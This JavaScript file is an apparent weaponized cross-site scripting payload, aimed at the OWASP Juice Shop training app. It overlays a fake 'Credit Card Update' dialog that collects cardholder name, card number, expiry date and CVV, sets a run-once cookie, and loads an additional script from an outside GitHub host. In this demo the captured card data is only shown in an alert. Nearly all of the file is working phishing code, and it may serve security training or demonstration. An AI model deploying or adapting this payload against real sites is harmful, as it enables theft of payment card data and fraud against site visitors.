document.getElementsByClassName('cdk-overlay-container')[0].remove();
document.getElementsByTagName('div')[0].remove();
let runOnce = false;
const phishHtml = `
<style>
  .input417 {
    width: 100%;
    padding: 18px 16px;
    display: inline-block;
    border: 1px solid #8f8f8f;
    border-radius: 4;
    box-sizing: border-box;
    background: #fff;
    background-clip: padding-box;
    font-color: #333;
    font-size: 16px;
  }
  .button417 {
    position: relative;
    display: block;
    width: 140px;
    height: 28px;
    margin: 24px auto auto auto;
    border-radius: 10px;
    background-color: #828c96;
    border: solid 1px transparent;
    color: #fff;
    font-size: 18px;
    font-weight: 300;
    cursor: pointer;
    transition: all .1s ease-in-out;
    &:hover {
      background-color: transparent;
      border-color: #fff;
      transition: all .1s ease-in-out;
    }
  }
  .ccupdate {
    position: fixed;
    font-family: Arial, Helvetica, sans-serif;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    background: rgba(0, 0, 0, 0);
    z-index: 99999;
    -moz-transition: all 2s ease-out;
    -webkit-transition: all 2s ease-out;
    -o-transition: all 2s ease-out;
    transition: all 2s ease-out;
    -webkit-transition-delay: 0.2s;
    -moz-transition-delay: 0.2s;
    -o-transition-delay: 0.2s;
    -transition-delay: 0.2s;
    display: block;
    pointer-events: none;
  }
  .ccupdate .dialog {
    width: 340px;
    position: relative;
    top: -1000px;
    margin: 10% auto;
    padding: 5px 20px 13px 20px;
    -moz-border-radius: 10px;
    -webkit-border-radius: 10px;
    border-radius: 10px;
    background: #fff;
    background: -moz-linear-gradient(#fff, #ccc);
    background: -webkit-linear-gradient(#fff, #ccc);
    background: -o-linear-gradient(#fff, #ccc);
    box-shadow: 0 0 10px #000;
    -moz-box-shadow: 0 0 10px #000;
    -webkit-box-shadow: 0 0 10px #000;
  }
  .ccupdate .dialog .ie7 {
    filter: progid:DXImageTransform.Microsoft.Shadow(color='#000', Direction=135, Strength=3);
  }
  .ccupdate:target {
    display: block;
    pointer-events: auto;
    background: rgba(4, 10, 30, 0.8);
    -moz-transition: all 0.5s ease-out;
    -webkit-transition: all 0.5s ease-out;
    -o-transition: all 0.5s ease-out;
    transition: all 0.5s ease-out;
  }
  .ccupdate:target .dialog {
    top: 70px;
    -moz-transition: all 0.8s ease-out;
    -webkit-transition: all 0.8s ease-out;
    -o-transition: all 0.8s ease-out;
    transition: all 0.8s ease-out;
    -webkit-transition-delay: 0.4s;
    -moz-transition-delay: 0.4s;
    -o-transition-delay: 0.4s;
    -transition-delay: 0.4s;
  }
</style>
<div class="ccupdate" id="ccupdate">
  <div class="dialog">
    <img src="https://preview.owasp-juice.shop/assets/public/images/JuiceShop_Logo.png" style="position: absolute; top: 20px; left: 20px; width: 24px">
    <h2 style="margin: 50px auto 20px auto; font-size: 1.50rem; letter-spacing: -.01em; line-height: 1.3; color: #333;">Credit Card Update</h2>
    <form name="ccform" onsubmit="return false;">
      <p>
        <input class="input417" type="text" name="ccholdername" placeholder="Cardholder Name" pattern="^(?<! )[&dash;a-zA-Z ']{2,26}$" title="first and last name of cardholder" required>
      </p>
      <p>
        <input class="input417" type="text" name="ccnumber" placeholder="Card Number" pattern="^(?:4[0-9]{12}(?:[0-9]{3})?|[25][1-7][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$" title="15 or 16 digits" required>
      </p>
      <p>
        <input class="input417" type="text" name="ccexpirydate" placeholder="Expiration Date" pattern="^(0[1-9]|1[0-2])(\/|-)(2[5-9]|3[0-9])$" title="MM/YY (month and year)" required>
      </p>
      <p>
        <input class="input417" type="text" name="cccvv" placeholder="CVV" pattern="^[0-9]{3,4}$" title="3 or 4 digits" required>
      </p>
      <p>
        <input class="button417" type="submit" name="ccsubmit" onclick="ccUpdate();" value="Update Now">
      </p>
    </form>
  </div>
</div>
`;
async function ccUpdate() {
  let ccnm = document.getElementsByName('ccholdername')[0].value;
  let ccno = document.getElementsByName('ccnumber')[0].value;
  let ccex = document.getElementsByName('ccexpirydate')[0].value;
  let cccv = document.getElementsByName('cccvv')[0].value;
  let rgxCcHldr = /^(?<! )[-a-zA-Z' ]{2,26}$/;
  let rgxCcNo = /^(?:4[0-9]{12}(?:[0-9]{3})?|[25][1-7][0-9]{14}|6(?:011|5[0-9][0-9])[0-9]{12}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|(?:2131|1800|35\d{3})\d{11})$/;
  let rgxCcExp = /^(0[1-9]|1[0-2])(\/|-)(2[5-9]|3[0-9])$/;
  let rgxCcCvv = /^[0-9]{3,4}$/;
  let redirURL = window.location.protocol + '//' + window.location.hostname + window.location.pathname;
  if(!rgxCcHldr.test(ccnm) || !rgxCcNo.test(ccno) || !rgxCcExp.test(ccex) || !rgxCcCvv.test(cccv)) {
    return;
  }
  alert('PHISHED CREDIT CARD DATA:\n   Cardholder Name: ' + ccnm + '\n   Card Number: ' + ccno + '\n   Expiration Date: ' + ccex + '\n   CVV: ' + cccv);
  window.open(redirURL, '_self');
}
function execPayld() {
  let phishDiv = document.createElement('div');
  phishDiv.innerHTML = phishHtml;
  document.getElementsByTagName('body')[0].appendChild(phishDiv);
  with(document)body.appendChild(createElement('script')).src=('https://raw.githubusercontent.com/lighthouseitsecurity/weaponizedXSS/refs/heads/main/CredCardPhishing/ext.js');
  setTimeout(() => {
    window.location.href = window.location.href.split('#')[0] + '#ccupdate';
  },
  1000);
}
// [CASE] RUN (PAYLOAD) ONCE ENABLED AND COOKIE NOT SET => SET RUNONCE COOKIE AND EXECUTE PAYLOAD
if ((runOnce) && !(/^(.*;)?\s*ccPhi\s*=\s*[^;]/.test(document.cookie))) {
  let cookExp = new Date();
  cookExp.setFullYear(cookExp.getFullYear() + 1);
  let cook = 'ccPhi=true; path=/; expires=' + cookExp.toUTCString();
  document.cookie = cook;
  execPayld();
}
// [CASE] RUN (PAYLOAD) ONCE NOT ENABLED => EXECUTE PAYLOAD
if (!runOnce) {
  execPayld();
}
// EoF
